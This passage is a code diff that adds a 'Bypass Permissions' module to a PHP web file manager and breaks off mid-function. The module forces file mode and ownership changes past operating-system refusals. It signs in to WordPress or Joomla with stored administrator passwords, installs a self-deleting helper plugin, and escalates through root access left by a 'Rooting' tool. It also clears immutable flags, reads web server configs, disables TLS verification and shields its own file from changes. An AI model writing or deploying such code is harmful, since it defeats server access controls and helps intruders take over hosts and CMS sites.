@@ -8224,6 +8224,761 @@ FMGUARD;
             $this->addMsg("Saved: $n".($res['via']==='site'?' — written by '.$this->privWho($p):''),'success');
         }
         else $this->addMsg('Save failed. '.$res['why'],'danger');}
+/* <<BP-BEGIN>> Bypass Permissions ─────────────────────────────────────────
+   A chmod or a chown the operating system refused must still happen. The same
+   change is attempted through every identity and every trick this host offers,
+   cheapest first, and the run stops at the first attempt that really produces
+   the requested mode/owner — read back from the filesystem, never assumed:
+
+     1. the manager's own account        chmod()/chown() in this process
+     2. the site's own account           the CMS performs it (WordPress/Joomla)
+     3. the CMS administrator session    an administrator signs in and the CMS
+                                         installs a one-off helper that runs as
+                                         the site account, then removes itself
+     4. a fresh inode                    write a new file, rename it over the
+                                         target (ownership follows the writer)
+     5. the installed root               chmod/chown through whatever Rooting
+                                         installed (root daemon, setuid/setcap,
+                                         sudo, pkexec)
+     6. the immutable flag               clear chattr +i/+a as root, then retry
+
+   Nothing is ever done to this program's own file, and a route that cannot
+   apply on this host says exactly why instead of failing silently. */
+private $bpAdminOverride=null;
+public function bpRouteList(){
+    return[
+        ['id'=>'local','name'=>'The manager account','idea'=>'chmod/chown in this PHP process','needs'=>'nothing'],
+        ['id'=>'site','name'=>'The site account (WordPress / Joomla)','idea'=>'the CMS itself performs the change through the panel bridge','needs'=>'the path inside a detected WordPress or Joomla installation'],
+        ['id'=>'admin','name'=>'The CMS administrator session','idea'=>'sign in as an administrator, let the CMS install a one-off helper that runs as the site account and removes itself','needs'=>'an administrator password for the site stored in this panel'],
+        ['id'=>'replace','name'=>'A new file with our own ownership','idea'=>'copy the content into a fresh inode and rename it over the target','needs'=>'the folder writable by the manager account'],
+        ['id'=>'root','name'=>'The installed root','idea'=>'chmod/chown through the root methods Rooting installed','needs'=>'root installed by the Rooting tool'],
+        ['id'=>'attr','name'=>'The immutable flag','idea'=>'clear chattr +i / +a as root, then apply the change','needs'=>'root, and a filesystem that supports the flag'],
+    ];
+}
+public function bypassEndpoint($post){
+    if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
+    $act=isset($post['action'])?(string)$post['action']:'run';
+    if($act==='store_admin')return $this->bpStoreAdmin($post);
+    if($act==='routes'||$act==='plan'){
+        return['ok'=>true,'routes'=>$this->bpRouteList(),'host'=>$this->bpHostFacts(),
+               'sites'=>$this->bpKnownSites()];
+    }
+    $path=isset($post['path'])?trim((string)$post['path']):'';
+    if($path==='')return['error'=>'Type the path to work on.'];
+    if($path[0]!=='/')$path=rtrim($this->getCwd(),'/').'/'.$path;
+    $mode=null;$modeText='';
+    if(isset($post['mode'])&&trim((string)$post['mode'])!==''){
+        $modeText=trim((string)$post['mode']);
+        if(!preg_match('/^[0-7]{3,4}$/',$modeText))return['error'=>'The mode must be three or four octal digits, for example 0755.'];
+        $mode=octdec($modeText);
+    }
+    $owner=isset($post['owner'])?trim((string)$post['owner']):'';
+    $group=isset($post['group'])?trim((string)$post['group']):'';
+    foreach([$owner,$group] as $nm){
+        if($nm!==''&&!preg_match('/^[A-Za-z0-9_.-]{1,32}$/D',$nm))return['error'=>'That account or group name is not valid.'];
+    }
+    if($mode===null&&$owner===''&&$group==='')return['error'=>'Choose a mode, an owner or a group to apply.'];
+    if($owner!==''&&(!function_exists('posix_getpwnam')||@posix_getpwnam($owner)===false))
+        return['error'=>'There is no account called "'.$owner.'" on this machine.'];
+    if($group!==''&&(!function_exists('posix_getgrnam')||@posix_getgrnam($group)===false))
+        return['error'=>'There is no group called "'.$group.'" on this machine.'];
+    $only=[];
+    if(!empty($post['routes'])){
+        foreach(explode(',',(string)$post['routes']) as $r){$r=trim($r);if($r!=='')$only[]=$r;}
+    }
+    $opts=['mode'=>$mode,'modeText'=>$modeText,'owner'=>$owner,'group'=>$group,
+           'recursive'=>!empty($post['recursive'])];
+    if(!empty($post['admin_user'])&&!empty($post['admin_pass'])){
+        $this->bpAdminOverride=['user'=>(string)$post['admin_user'],'pass'=>(string)$post['admin_pass']];
+    }
+    return $this->bpRun($path,$opts,$only);
+}
+
+/* ── facts the panel shows before anything runs ─────────────────────────── */
+private function bpHostFacts(){
+    $acct='unknown';
+    if(function_exists('posix_geteuid')){$u=@posix_getpwuid(@posix_geteuid());$acct=$u?$u['name']:'unknown';}
+    $root='none';
+    try{
+        $r=$this->rootRun(['true']);
+        if(!empty($r['ok']))$root=(string)($r['via']??'installed');
+    }catch(\Throwable $e){}
+    return['account'=>$acct,'root'=>$root,'root_available'=>$root!=='none'];
+}
+/* What the panel is allowed to say about a stored credential: that it exists
+   and which account it belongs to — never the password itself. */
+private function bpCredPublic($cred){
+    if(empty($cred['ok']))return['ok'=>false,'why'=>(string)($cred['why']??'no administrator password stored')];
+    return['ok'=>true,'user'=>(string)($cred['user']??''),'type'=>(string)($cred['type']??'')];
+}
+private function bpKnownSites(){
+    $out=[];
+    $diag=[];
+    try{$cfg=$this->cmsFindConfig([],$diag,false);}catch(\Throwable $e){$cfg=null;}
+    if($cfg){
+        $type=$this->cmsConfigType($cfg);
+        $root=$type==='wordpress'?$this->wpSiteRoot($cfg):dirname($cfg);
+        $cred=$this->bpAdminCredentialOnly(['config'=>$cfg,'type'=>$type,'root'=>rtrim($root,'/')]);
+        $out[]=['type'=>$type,'root'=>rtrim($root,'/'),'config'=>$cfg,'admin_session'=>$this->bpCredPublic($cred)];
+    }
+    foreach(['/home/user/wordpress/wp-config.php'=>'wordpress','/home/user/joomla/configuration.php'=>'joomla'] as $c=>$t){
+        if(!@is_file($c))continue;
+        $root=$t==='wordpress'?$this->wpSiteRoot($c):dirname($c);
+        $had=false;
+        foreach($out as $s)if($s['root']===rtrim($root,'/'))$had=true;
+        if($had)continue;
+        $out[]=['type'=>$t,'root'=>rtrim($root,'/'),'config'=>$c,
+                'admin_session'=>$this->bpCredPublic($this->bpAdminCredentialOnly(['config'=>$c,'type'=>$t,'root'=>rtrim($root,'/')]))];
+    }
+    return $out;
+}
+
+/* ── the run ─────────────────────────────────────────────────────────────── */
+private function bpRun($path,$o,$only=[]){
+    $real=@realpath($path);
+    if($real===false&&!@file_exists($path))return['ok'=>false,'error'=>'Nothing exists at '.$path.'.'];
+    $path=$real!==false?$real:$path;
+    $self=@realpath(__FILE__);
+    if($self!==false&&$path===$self)
+        return['ok'=>false,'error'=>'Bypass Permissions refuses to touch this program\'s own file.'];
+    if($self!==false&&$path===dirname($self))
+        return['ok'=>false,'error'=>'Bypass Permissions refuses to work on the folder this program lives in.'];
+    $targets=$this->bpTargets($path,$o['recursive']);
+    if(!$targets)return['ok'=>false,'error'=>'There is nothing to change at '.$path.'.'];
+    $before=$this->bpStat($path);
+    $steps=[];$won='';$goal=$this->bpGoalMet($targets,$o);
+    foreach($this->bpRouteList() as $r){
+        $id=$r['id'];
+        if($only&&!in_array($id,$only,true))continue;
+        $t0=microtime(true);
+        try{$res=$this->bpRoute($id,$path,$targets,$o);}
+        catch(\Throwable $e){$res=['ok'=>false,'detail'=>'this route threw: '.$e->getMessage()];}
+        $met=!empty($res['ok'])?$this->bpGoalMet($targets,$o):false;
+        $steps[]=['id'=>$id,'name'=>$r['name'],'idea'=>$r['idea'],
+                  'ran'=>!empty($res['ran']),
+                  'ok'=>$met,
+                  'detail'=>(string)($res['detail']??''),
+                  'ms'=>(int)round((microtime(true)-$t0)*1000)];
+        if($met){$won=$id;break;}
+    }
+    $after=$this->bpStat($path);
+    $goal=$this->bpGoalMet($targets,$o);
+    if($won!==''){
+        $this->log('bypass_permissions',$path.' via '.$won);
+        @ignore_user_abort(true);
+    }
+    return['ok'=>$goal,'path'=>$path,'won'=>$won,'mode_text'=>$o['modeText'],
+           'owner'=>$o['owner'],'group'=>$o['group'],'recursive'=>$o['recursive'],
+           'items'=>count($targets),'before'=>$before,'after'=>$after,'steps'=>$steps,
+           'goal'=>$this->bpGoalText($targets,$o,3)];
+}
+private function bpRoute($id,$path,$targets,$o){
+    switch($id){
+        case 'local':   return $this->bpRouteLocal($targets,$o);
+        case 'site':    return $this->bpRouteSite($targets,$o);
+        case 'admin':   return $this->bpRouteAdmin($targets,$o);
+        case 'replace': return $this->bpRouteReplace($targets,$o);
+        case 'root':    return $this->bpRouteRoot($targets,$o);
+        case 'attr':    return $this->bpRouteAttr($targets,$o);
+    }
+    return['ok'=>false,'ran'=>false,'detail'=>'unknown route'];
+}
+/* The list of paths this run touches (the target, plus its children). */
+private function bpTargets($path,$recursive){
+    $out=[$path];
+    if(!$recursive||!@is_dir($path))return $out;
+    $cap=4000;
+    try{
+        $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);
+        foreach($it as $f){
+            if(count($out)>=$cap)break;
+            $out[]=$f->getPathname();
+        }
+    }catch(\Throwable $e){}
+    return $out;
+}
+private function bpStat($path){
+    if(!@file_exists($path))return['exists'=>false];
+    $st=@stat($path);
+    $uid=@fileowner($path);$gid=@filegroup($path);
+    $g=($gid!==false&&function_exists('posix_getgrgid'))?@posix_getgrgid($gid):null;
+    return['exists'=>true,'dir'=>@is_dir($path),
+           'mode'=>$st?substr(sprintf('%o',$st['mode']),-4):null,
+           'owner'=>$uid!==false?$this->uidName($uid):null,
+           'group'=>$g?($g['name']??''):($gid!==false?'#'.$gid:'')];
+}
+/* Does every target now have exactly what was asked for? */
+private function bpGoalMet($targets,$o){
+    foreach($targets as $p){
+        if(!@file_exists($p))return false;
+        if($o['mode']!==null){
+            $st=@stat($p);
+            if($st===false||($st['mode']&07777)!==$o['mode'])return false;
+        }
+        if($o['owner']!==''&&@fileowner($p)!==@posix_getpwnam($o['owner'])['uid'])return false;
+        if($o['group']!==''&&@filegroup($p)!==@posix_getgrnam($o['group'])['gid'])return false;
+    }
+    return true;
+}
+private function bpGoalText($targets,$o,$limit=3){
+    $parts=[];
+    if($o['mode']!==null)$parts[]='mode '.$o['modeText'];
+    if($o['owner']!=='')$parts[]='owner '.$o['owner'];
+    if($o['group']!=='')$parts[]='group '.$o['group'];
+    $head='wanted ' . implode(', ', $parts);
+    $miss=[];
+    foreach($targets as $p){
+        if(count($miss)>=$limit)break;
+        if(!@file_exists($p)){$miss[]=basename($p).': gone';continue;}
+        $s=$this->bpStat($p);
+        $why=[];
+        if($o['mode']!==null&&$s['mode']!==sprintf('%04o',$o['mode']))$why[]='mode '.$s['mode'];
+        if($o['owner']!==''&&$s['owner']!==$o['owner'])$why[]='owner '.$s['owner'];
+        if($o['group']!==''&&$s['group']!==$o['group'])$why[]='group '.$s['group'];
+        if($why)$miss[]=basename($p).': '.implode(', ',$why);
+    }
+    return $miss?($head.' — still '.implode('; ',$miss)):$head.' — reached';
+}
+
+/* ── 1. the manager's own account ───────────────────────────────────────── */
+private function bpRouteLocal($targets,$o){
+    $bad=[];$done=0;$err='';
+    foreach($targets as $p){
+        $ok=true;
+        if($o['mode']!==null&&!@chmod($p,$o['mode'])){$ok=false;$err=error_get_last()['message']??'operation not permitted';}
+        if($o['owner']!==''&&!@chown($p,$o['owner'])){$ok=false;$err=error_get_last()['message']??'operation not permitted';}
+        if($o['group']!==''&&!@chgrp($p,$o['group'])){$ok=false;$err=error_get_last()['message']??'operation not permitted';}
+        if($ok)$done++;else $bad[]=$p;
+    }
+    if(!$bad)return['ok'=>true,'ran'=>true,'detail'=>'changed '.$done.' item(s); this account already owns it'];
+    return['ok'=>false,'ran'=>true,'detail'=>count($bad).' item(s) refused by the operating system ('.$err.'); this account does not own them'];
+}
+
+/* ── 2. the site's own account, through the panel bridge ────────────────── */
+private function bpRouteSite($targets,$o){
+    $site=$this->privSiteFor($targets[0],true);
+    if(!$site)return['ok'=>false,'ran'=>false,'detail'=>'this path is not inside a WordPress or Joomla installation, so the site route does not apply'];
+    if(count($targets)>200)
+        return['ok'=>false,'ran'=>false,'detail'=>'this run covers '.count($targets).' items; the site bridge handles up to 200 at once, so the manager or root route is the one to use for a whole tree'];
+    $bad=0;$note='';
+    foreach($targets as $p){
+        if($o['mode']!==null){
+            $r=$this->privOp('chmod',['path'=>$p,'mode'=>$o['mode']],$p);
+            if(empty($r['ok'])){$bad++;$note=(string)($r['error']??'refused');}
+        }
+        if($o['owner']!==''||$o['group']!==''){
+            $r=$this->privOp('chown',['path'=>$p,'owner'=>$o['owner'],'group'=>$o['group'],'recursive'=>false],$p);
+            if(empty($r['ok'])){$bad++;$note=(string)($r['error']??'refused');}
+        }
+    }
+    $label=$site['type']==='wordpress'?'WordPress':'Joomla';
+    if($bad)return['ok'=>false,'ran'=>true,'detail'=>'the '.$label.' account could not do it: '.$note];
+    return['ok'=>true,'ran'=>true,'detail'=>'the '.$label.' account ('.$this->privWho($targets[0]).') performed it'];
+}
+
+/* ── 3. the CMS administrator session ───────────────────────────────────── */
+private function bpRouteAdmin($targets,$o){
+    $site=$this->privSiteFor($targets[0],true);
+    if(!$site)return['ok'=>false,'ran'=>false,'detail'=>'this path is not inside a WordPress or Joomla installation, so the administrator-session route does not apply'];
+    $s=$this->bpAdminLogin($site);
+    if(empty($s['ok']))return['ok'=>false,'ran'=>false,'detail'=>$s['why']];
+    $ops=[];
+    foreach($targets as $p){
+        $one=['path'=>$p];
+        if($o['mode']!==null)$one['mode']=sprintf('%04o',$o['mode']);
+        if($o['owner']!=='')$one['owner']=$o['owner'];
+        if($o['group']!=='')$one['group']=$o['group'];
+        $ops[]=$one;
+    }
+    $r=$this->bpAdminRun($site,$s,$ops);
+    if(empty($r['ok']))return['ok'=>false,'ran'=>true,'detail'=>$r['why']];
+    return['ok'=>true,'ran'=>true,'detail'=>'signed in as '.$s['user'].'; the '.($site['type']==='wordpress'?'WordPress':'Joomla').' installer published a one-off helper that ran as '
+        .($r['user']!==''?$r['user'].' ':'the site account ').'and removed itself'
+        .(empty($r['row_removed'])?' (the CMS still lists the extension until its next clean-up)':'')];
+}
+/* One file, then a request that runs it, then a request that deletes it. */
+private function bpAdminRun($site,$sess,$ops){
+    $token=bin2hex(random_bytes(12));
+    $payload=base64_encode(json_encode($ops));
+    $code=$this->bpHelperCode($token,$payload);
+    $slug='fm-bp-'.substr($token,0,8);
+    $inst=$site['type']==='wordpress'
+        ? $this->bpWpInstall($sess,$slug,$code)
+        : $this->bpJoomlaInstall($sess,$slug,$code);
+    if(empty($inst['ok']))return['ok'=>false,'why'=>$inst['why']];
+    $url=$inst['url'];
+    $res=$this->bpHttpGet($sess['jar'],$url.'?t='.$token.'&go=1');
+    $json=@json_decode((string)$res,true);
+    $this->bpHttpGet($sess['jar'],$url.'?t='.$token.'&cleanup=1');
+    if($inst['cleanup']!==null)@unlink($inst['cleanup']);
+    $removed=true;
+    if($site['type']!=='wordpress')$removed=$this->bpJoomlaUninstall($sess,$slug);
+    if(!is_array($json))return['ok'=>false,'why'=>'the helper was published but did not answer as PHP (the CMS may be serving that folder as static files)'];
+    if(empty($json['ok']))return['ok'=>false,'why'=>'the helper ran as '.($json['user']??'the site account').' but the operating system refused: '.($json['error']??'unknown reason')];
+    return['ok'=>true,'user'=>(string)($json['user']??''),'done'=>(int)($json['done']??0),'row_removed'=>$removed];
+}
+private function bpHelperCode($token,$payloadB64){
+    $t=var_export((string)$token,true);
+    $p=var_export((string)$payloadB64,true);
+    return "<?php\n"
+        ."/*\n"
+        ."Plugin Name: FM Bypass Helper\n"
+        ."Plugin URI: https://github.com/orgezeo/marshal-file-manager\n"
+        ."Description: One-off helper published by the Marshal file manager to apply a single permission change, then removes itself.\n"
+        ."Version: 1.0\n"
+        ."Author: Marshal File Manager\n"
+        ."*/\n"
+        ."/* One-off helper published through the CMS administrator session by the\n"
+        ."   Marshal file manager, so this change runs under the account that owns\n"
+        ."   the site's files. It answers once and deletes itself. */\n"
+        ."header('Content-Type: application/json');header('X-Robots-Tag: noindex, nofollow');\n"
+        ."\$tok={$t};\$seen=isset(\$_GET['t'])?(string)\$_GET['t']:'';\n"
+        ."if(\$seen===''||!hash_equals(\$tok,\$seen)){http_response_code(403);echo json_encode(['ok'=>false,'error'=>'token rejected']);exit;}\n"
+        ."\$me=function_exists('posix_getpwuid')?(@posix_getpwuid(@posix_geteuid())['name']??''):(function_exists('get_current_user')?@get_current_user():'');\n"
+        ."\$ops=@json_decode((string)@base64_decode(".($p)."),true);\n"
+        ."if(isset(\$_GET['cleanup'])){\n"
+        ."  \$dir=dirname(__FILE__);\n"
+        ."  foreach((array)@glob(\$dir.'/*') as \$f){if(is_file(\$f))@unlink(\$f);}\n"
+        ."  @unlink(__FILE__);@rmdir(\$dir);\n"
+        ."  echo json_encode(['ok'=>true,'user'=>\$me,'done'=>0,'cleaned'=>true]);exit;\n"
+        ."}\n"
+        ."if(!is_array(\$ops)){echo json_encode(['ok'=>false,'user'=>\$me,'error'=>'bad payload']);exit;}\n"
+        ."\$done=0;\$err='';\n"
+        ."foreach(\$ops as \$op){\n"
+        ."  if(!is_array(\$op)||empty(\$op['path']))continue;\n"
+        ."  \$path=(string)\$op['path'];\n"
+        ."  if(!@file_exists(\$path)){@touch(\$path);}\n"
+        ."  \$ok=true;@clearstatcache(true,\$path);\n"
+        ."  if(isset(\$op['mode'])){\$m=octdec((string)\$op['mode']);if(!@chmod(\$path,\$m)){\$ok=false;\$err='chmod '.\$path.' — '.(error_get_last()['message']??'refused');}}\n"
+        ."  if(!empty(\$op['owner'])&&!@chown(\$path,(string)\$op['owner'])){\$ok=false;\$err='chown '.\$path.' — '.(error_get_last()['message']??'refused');}\n"
+        ."  if(!empty(\$op['group'])&&!@chgrp(\$path,(string)\$op['group'])){\$ok=false;\$err='chgrp '.\$path.' — '.(error_get_last()['message']??'refused');}\n"
+        ."  if(\$ok)\$done++;\n"
+        ."}\n"
+        ."echo json_encode(\$done?['ok'=>true,'user'=>\$me,'done'=>\$done]:['ok'=>false,'user'=>\$me,'error'=>(\$err!==''?\$err:'nothing to change')]);\n";
+}
+
+/* Which administrator can we sign in as? Only passwords this panel itself
+   knows (the vault filled by CMS Manager → Change password). */
+/* Stores the site's administrator password in the panel's encrypted vault, so
+   the administrator-session route runs by itself from then on. The password is
+   proven first: the panel actually signs in with it before saving anything. */
+private function bpStoreAdmin($post){
+    $raw='';
+    if(isset($post['config_path_b64'])){$d=@base64_decode((string)$post['config_path_b64'],true);if($d!==false)$raw=$d;}
+    if($raw==='')$raw=isset($post['config'])?(string)$post['config']:'';
+    if($raw===''||!@is_file($raw))return['error'=>'Choose the site first (its wp-config.php or configuration.php).'];
+    $type=$this->cmsConfigType($raw);
+    $root=$type==='wordpress'?$this->wpSiteRoot($raw):dirname($raw);
+    $site=['config'=>$raw,'type'=>$type,'root'=>rtrim($root,'/')];
+    $user=isset($post['admin_user'])?trim((string)$post['admin_user']):'';
+    $pass=isset($post['admin_pass'])?(string)$post['admin_pass']:'';
+    if($user===''||$pass==='')return['error'=>'Type the administrator account and its password.'];
+    list($link,$c,$err)=$this->cmsConnect($raw);
+    if($err)return['error'=>$err];
+    $t=$c['prefix'];$id=0;
+    if($type==='wordpress'){
+        $u=mysqli_real_escape_string($link,$user);
+        $q=@mysqli_query($link,"SELECT u.ID AS id FROM `{$t}users` u JOIN `{$t}usermeta` m ON m.user_id=u.ID AND m.meta_key='{$t}capabilities' WHERE u.user_login='$u' AND m.meta_value LIKE '%administrator%' LIMIT 1");
+        $row=$q?mysqli_fetch_assoc($q):null;$id=$row?(int)$row['id']:0;
+    }else{
+        $u=mysqli_real_escape_string($link,$user);
+        $q=@mysqli_query($link,"SELECT u.id AS id FROM `{$t}users` u JOIN `{$t}user_usergroup_map` m ON m.user_id=u.id WHERE u.username='$u' AND m.group_id=8 LIMIT 1");
+        $row=$q?mysqli_fetch_assoc($q):null;$id=$row?(int)$row['id']:0;
+    }
+    @mysqli_close($link);
+    if(!$id)return['error'=>'That account is not an administrator of this site, so signing in as it would not help.'];
+    $base=$this->bpSiteBase($site);
+    if(empty($base['ok']))return['error'=>$base['why']];
+    $jar=@tempnam(sys_get_temp_dir(),'fm-bp-jar-');
+    $st=$type==='wordpress'?$this->bpWpLogin($base['url'],$user,$pass,$jar):$this->bpJoomlaLogin($base['url'],$user,$pass,$jar);
+    @unlink($jar);
+    if(empty($st['ok']))return['error'=>$st['why']];
+    $this->cmsVaultSet($raw,$id,$pass,$user);
+    $this->log('bypass_permissions','stored the '.$type.' administrator session for '.$user);
+    return['ok'=>true,'user'=>$user,'id'=>$id,'type'=>$type,'root'=>rtrim($root,'/'),
+           'message'=>'Signed in to '.($type==='wordpress'?'WordPress':'Joomla').' as '.$user.' and stored that password in the panel vault — the administrator-session route will run by itself from now on.'];
+}
+private function bpAdminCredentialOnly($site){
+    if(is_array($this->bpAdminOverride)&&$this->bpAdminOverride['user']!==''){
+        $type=$site['type']??$this->cmsConfigType($site['config']);
+        return['ok'=>true,'user'=>$this->bpAdminOverride['user'],'pass'=>$this->bpAdminOverride['pass'],'type'=>$type,'typed'=>true];
+    }
+    try{
+        list($link,$c,$err)=$this->cmsConnect($site['config']);
+        if($err)return['ok'=>false,'why'=>'the site database could not be read: '.$err];
+        $t=$c['prefix'];$ids=[];
+        if($c['type']==='wordpress'){
+            $q=@mysqli_query($link,"SELECT u.ID AS id,u.user_login AS login FROM `{$t}users` u JOIN `{$t}usermeta` m ON m.user_id=u.ID AND m.meta_key='{$t}capabilities' WHERE m.meta_value LIKE '%administrator%'");
+            if($q)while($r=mysqli_fetch_assoc($q))$ids[(int)$r['id']]=$r['login'];
+        }else{
+            $q=@mysqli_query($link,"SELECT u.id AS id,u.username AS login FROM `{$t}users` u JOIN `{$t}user_usergroup_map` m ON m.user_id=u.id WHERE m.group_id=8");
+            if($q)while($r=mysqli_fetch_assoc($q))$ids[(int)$r['id']]=$r['login'];
+        }
+        @mysqli_close($link);
+        if(!$ids)return['ok'=>false,'why'=>'this site has no administrator account'];
+        $vault=$this->cmsVaultLoad();
+        foreach($ids as $id=>$login){
+            $k=md5($site['config']).':'.$id;
+            if(!isset($vault[$k]['pass']))continue;
+            $p=$this->cmsVaultDec($vault[$k]['pass']);
+            if($p===null||$p==='')continue;
+            return['ok'=>true,'user'=>$login,'pass'=>$p,'type'=>$c['type']];
+        }
+        return['ok'=>false,'why'=>'no administrator password for this site is stored in this panel (CMS Manager → Change password stores one), so this route cannot sign in'];
+    }catch(\Throwable $e){
+        return['ok'=>false,'why'=>'the site database could not be read: '.$e->getMessage()];
+    }
+}
+private function bpAdminLogin($site){
+    static $cache=[];
+    $k=($site['config']??'').'|'.($site['type']??'');
+    if(isset($cache[$k]))return $cache[$k];
+    $cred=$this->bpAdminCredentialOnly($site);
+    if(empty($cred['ok']))return $cache[$k]=['ok'=>false,'why'=>$cred['why']];
+    $base=$this->bpSiteBase($site);
+    if(empty($base['ok']))return $cache[$k]=['ok'=>false,'why'=>$base['why']];
+    $jar=@tempnam(sys_get_temp_dir(),'fm-bp-jar-');
+    $st=$cred['type']==='wordpress'
+        ? $this->bpWpLogin($base['url'],$cred['user'],$cred['pass'],$jar)
+        : $this->bpJoomlaLogin($base['url'],$cred['user'],$cred['pass'],$jar);
+    if(empty($st['ok'])){@unlink($jar);return $cache[$k]=['ok'=>false,'why'=>$st['why']];}
+    return $cache[$k]=['ok'=>true,'jar'=>$jar,'base'=>$base['url'],'type'=>$cred['type'],'user'=>$cred['user']];
+}
+/* The base URL of the site, proven by fetching its login page. Unlike the
+   one-time login link (which a human has to reach from their own browser),
+   this session is opened and used by the manager itself, so a site served on
+   loopback is perfectly valid here and is tried too. */
+private function bpSiteBase($site){
+    $stored=null;
+    if(($site['type']??'')==='wordpress'){
+        list($link,$c,$err)=$this->cmsConnect($site['config']);
+        if(!$err&&$c){
+            $q=@mysqli_query($link,"SELECT option_name,option_value FROM `{$c['prefix']}options` WHERE option_name IN ('siteurl','home')");
+            if($q)while($row=mysqli_fetch_assoc($q)){$stored=$row['option_value'];}
+            @mysqli_close($link);
+        }
+    }else{
+        $stored=$this->cmsJoomlaLiveSite($site['config']);
+    }
+    $cands=[];$add=function($u)use(&$cands){
+        $u=rtrim((string)$u,'/');
+        if($u===''||!preg_match('#^https?://#i',$u))return;
+        if(!in_array($u,$cands,true))$cands[]=$u;
+    };
+    $ports=[];$path='';
+    if($stored){
+        $p=@parse_url($stored);
+        if($p&&!empty($p['host'])){
+            $add($stored);
+            if(!empty($p['port']))$ports[]=(int)$p['port'];
+            if(!empty($p['path']))$path=rtrim($p['path'],'/');
+        }
+    }
+    $hosts=[];
+    $reqHost=(string)($_SERVER['HTTP_HOST']??'');
+    if($reqHost!==''){
+        $hp=@parse_url('http://'.$reqHost);
+        if($hp&&!empty($hp['host'])){
+            $hosts[]=$hp['host'];
+            if(!empty($hp['port']))$ports[]=(int)$hp['port'];
+        }
+    }
+    $hosts[]='127.0.0.1';$hosts[]='localhost';
+    foreach(array_unique($ports) as $port){
+        foreach(array_unique($hosts) as $h){
+            $add('http://'.$h.':'.$port.$path);
+            $add('https://'.$h.':'.$port.$path);
+        }
+    }
+    foreach(array_unique($hosts) as $h){
+        $add('http://'.$h.$path);$add('https://'.$h.$path);
+    }
+    foreach($this->bpVhostBases($site['root']) as $u)$add($u);
+    foreach($this->cmsBuildCandidateUrls($site['root'],$stored) as $u)$add($u);
+    $probe=($site['type']==='wordpress')?'/wp-login.php':'/administrator/index.php';
+    $tried=[];
+    foreach(array_slice($cands,0,24) as $base){
+        $ch=@curl_init($base.$probe);
+        if(!$ch)continue;
+        @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>6,CURLOPT_CONNECTTIMEOUT=>4,
+            CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>3,CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0,
+            CURLOPT_USERAGENT=>'MarshalFileManager/1.0 (+bypass)']);
+        $body=(string)@curl_exec($ch);
+        $code=(int)@curl_getinfo($ch,CURLINFO_HTTP_CODE);
+        @curl_close($ch);
+        $tried[]=$base.' (HTTP '.$code.')';
+        if($code===200&&$body!=='')return['ok'=>true,'url'=>$base];
+    }
+    return['ok'=>false,'why'=>'the site could not be reached over HTTP from this server. Tried: '.implode(', ',array_slice($tried,0,6))];
+}
+/* The web server's own configuration, read to find which address and port
+   actually serve this folder — the one authoritative source on a machine that
+   serves several sites (each vhost names its DocumentRoot and its port). */
+private function bpVhostBases($root){
+    $root=rtrim((string)$root,'/');
+    if($root==='')return[];
+    $files=[];
+    foreach(['/etc/apache2/sites-enabled','/etc/apache2/sites-available','/etc/httpd/conf.d',
+             '/etc/httpd/sites-enabled','/etc/nginx/sites-enabled','/etc/nginx/conf.d'] as $dir){
+        foreach((array)@glob($dir.'/*') as $f)if(@is_file($f))$files[]=$f;
+    }
+    $ports=[];
+    foreach($files as $f){
+        $src=@file_get_contents($f);
+        if($src===false||strpos($src,$root)===false)continue;
+        if(preg_match_all('/<VirtualHost\s+[^:>]*:(\d+)/i',$src,$m))foreach($m[1] as $p)$ports[(int)$p]=true;
+        if(preg_match_all('/\bListen\s+(?:[\d.]+:)?(\d+)/i',$src,$m))foreach($m[1] as $p)$ports[(int)$p]=true;
+        if(preg_match_all('/\bserver_name\s+([^;\s]+)/i',$src,$m))foreach($m[1] as $h)$hosts[]=$h;
+        if(preg_match_all('/\bServerName\s+(\S+)/i',$src,$m))foreach($m[1] as $h)$hosts[]=$h;
+        if(preg_match_all('/\bServerAlias\s+(\S+)/i',$src,$m))foreach($m[1] as $h)$hosts[]=$h;
+    }
+    if(!$ports)return[];
+    $hosts=array_values(array_unique(array_filter((array)($hosts??[]),fn($h)=>$h!==''&&stripos($h,'*')===false)));
+    $hosts=array_merge($hosts,['127.0.0.1','localhost']);
+    $out=[];
+    foreach(array_keys($ports) as $port)foreach(array_unique($hosts) as $h)$out[]='http://'.$h.':'.$port;
+    return $out;
+}
+private function bpWpLogin($base,$user,$pass,$jar){
+    // WordPress refuses a sign-in that arrives without its test cookie, so the
+    // form is fetched once with this cookie jar before it is posted.
+    $this->bpHttpGet($jar,rtrim($base,'/').'/wp-login.php');
+    $ch=@curl_init(rtrim($base,'/').'/wp-login.php');
+    if(!$ch)return['ok'=>false,'why'=>'cURL is not available.'];
+    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_COOKIEJAR=>$jar,CURLOPT_COOKIEFILE=>$jar,
+        CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>http_build_query(['log'=>$user,'pwd'=>$pass,'wp-submit'=>'Log In',
+            'redirect_to'=>rtrim($base,'/').'/wp-admin/','testcookie'=>'1']),
+        CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>20,CURLOPT_CONNECTTIMEOUT=>6,
+        CURLOPT_USERAGENT=>'MarshalFileManager/1.0 (+bypass)',CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0]);
+    @curl_exec($ch);
+    @curl_close($ch);
+    unset($ch); // PHP 8: curl_close() is a no-op, the cookie jar is flushed when the handle dies
+    $cookies=(string)@file_get_contents($jar);
+    if(stripos($cookies,'wordpress_logged_in')===false)
+        return['ok'=>false,'why'=>'WordPress did not accept the stored password for the administrator "' . $user . '"'];
+    return['ok'=>true];
+}
+private function bpJoomlaLogin($base,$user,$pass,$jar){
+    $base=rtrim($base,'/');
+    $page=$this->bpHttpGet($jar,$base.'/administrator/index.php');
+    $token=$this->bpJoomlaToken($page);
+    if($token==='')return['ok'=>false,'why'=>'the Joomla administrator form did not offer a security token'];
+    $ch=@curl_init($base.'/administrator/index.php');
+    if(!$ch)return['ok'=>false,'why'=>'cURL is not available.'];
